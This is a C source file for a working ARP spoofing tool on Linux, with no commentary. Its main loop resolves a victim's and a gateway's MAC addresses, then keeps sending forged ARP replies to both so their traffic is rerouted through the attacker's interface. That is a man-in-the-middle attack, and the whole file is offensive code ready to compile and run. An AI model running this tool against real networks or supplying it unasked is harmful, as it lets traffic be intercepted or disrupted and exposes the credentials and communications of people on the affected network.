#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <errno.h>

#define BUF_SIZE 42

void get_interface_mac(const char *iface, uint8_t *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, iface);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        exit(1);
    }
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_interface_ip(const char *iface, char *ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, iface);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        exit(1);
    }
    close(fd);
    strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void resolve_mac(const char *iface, const char *target_ip, uint8_t *mac) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    uint8_t buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);

    struct ethhdr *eth = (struct ethhdr *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + ETH_HLEN);

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_halen = ETH_ALEN;

    struct ifreq ifr;
    strcpy(ifr.ifr_name, iface);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    addr.sll_ifindex = ifr.ifr_ifindex;

    uint8_t attacker_mac[6];
    get_interface_mac(iface, attacker_mac);
    memcpy(addr.sll_addr, attacker_mac, 6);

    memset(eth->h_dest, 0xff, 6); // broadcast
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REQUEST);

    memcpy(arp->arp_sha, attacker_mac, 6);
    inet_pton(AF_INET, "0.0.0.0", arp->arp_spa);
    memset(arp->arp_tha, 0x00, 6);
    inet_pton(AF_INET, target_ip, arp->arp_tpa);

    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("sendto");
        close(sock);
        exit(1);
    }

    while (1) {
        uint8_t recv_buf[BUF_SIZE];
        ssize_t len = recv(sock, recv_buf, BUF_SIZE, 0);
        if (len < 0) continue;

        struct ether_arp *reply = (struct ether_arp *)(recv_buf + ETH_HLEN);
        if (ntohs(reply->ea_hdr.ar_op) == ARPOP_REPLY) {
            if (memcmp(reply->arp_spa, arp->arp_tpa, 4) == 0) {
                memcpy(mac, reply->arp_sha, 6);
                break;
            }
        }
    }

    close(sock);
}

void send_arp_spoof(const char *iface, const uint8_t *src_mac, const char *spoof_ip,
                    const uint8_t *target_mac, const char *target_ip) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    uint8_t buffer[BUF_SIZE];
    memset(buffer, 0, BUF_SIZE);

    struct ethhdr *eth = (struct ethhdr *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + ETH_HLEN);

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_halen = ETH_ALEN;

    struct ifreq ifr;
    strcpy(ifr.ifr_name, iface);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    addr.sll_ifindex = ifr.ifr_ifindex;
    memcpy(addr.sll_addr, src_mac, 6);

    memcpy(eth->h_dest, target_mac, 6);
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, src_mac, 6);
    inet_pton(AF_INET, spoof_ip, arp->arp_spa);
    memcpy(arp->arp_tha, target_mac, 6);
    inet_pton(AF_INET, target_ip, arp->arp_tpa);

    if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("sendto");
        close(sock);
        exit(1);
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <interface> <victim_ip> <gateway_ip> <interval_sec>\n", argv[0]);
        exit(1);
    }

    const char *iface = argv[1];
    const char *victim_ip = argv[2];
    const char *gateway_ip = argv[3];
    int interval = atoi(argv[4]);

    uint8_t attacker_mac[6], victim_mac[6], gateway_mac[6];

    get_interface_mac(iface, attacker_mac);
    resolve_mac(iface, victim_ip, victim_mac);
    resolve_mac(iface, gateway_ip, gateway_mac);

    printf("[*] Starting ARP spoofing...\n");
    while (1) {
        send_arp_spoof(iface, attacker_mac, gateway_ip, victim_mac, victim_ip);
        send_arp_spoof(iface, attacker_mac, victim_ip, gateway_mac, gateway_ip);

        sleep(interval);
    }

    return 0;
}
